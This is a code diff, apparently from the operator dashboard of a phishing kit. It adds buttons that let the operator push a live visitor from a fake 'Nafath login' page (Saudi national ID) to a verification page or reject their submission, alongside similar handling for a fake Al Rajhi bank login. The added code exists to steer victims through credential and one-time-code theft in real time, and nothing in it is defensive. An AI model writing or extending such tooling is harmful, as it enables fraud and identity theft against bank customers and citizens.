@@ -1868,6 +1868,50 @@
               }, 100);
             }
             
+            // إضافة أزرار لتسجيل دخول نفاذ
+            if (dataEntry.page === 'تسجيل دخول نفاذ') {
+              const nafathLoginNafathBtnId = 'nafath-login-nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const nafathLoginRejectBtnId = 'nafath-login-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathLoginNafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + nafathLoginRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const nafathBtn = document.getElementById(nafathLoginNafathBtnId);
+                const rejectBtn = document.getElementById(nafathLoginRejectBtnId);
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-verify');
+                    const originalText = nafathBtn.textContent;
+                    const originalClasses = ['bg-purple-600', 'hover:bg-purple-700'];
+                    nafathBtn.textContent = 'تم الإرسال ✓';
+                    nafathBtn.classList.remove(...originalClasses);
+                    nafathBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathBtn.textContent = originalText;
+                      nafathBtn.classList.remove('bg-green-600');
+                      nafathBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    const originalText = rejectBtn.textContent;
+                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
+                    rejectBtn.textContent = 'تم الرفض ✓';
+                    rejectBtn.classList.remove(...originalClasses);
+                    rejectBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      rejectBtn.textContent = originalText;
+                      rejectBtn.classList.remove('bg-green-600');
+                      rejectBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
             // إضافة أزرار للراجحي تسجيل الدخول
             if (dataEntry.page === 'تسجيل الدخول الراجحى') {
               const rajhiPhoneBtnId = 'rajhi-phone-btn-' + visitor.socketId + '-' + dataIndex;
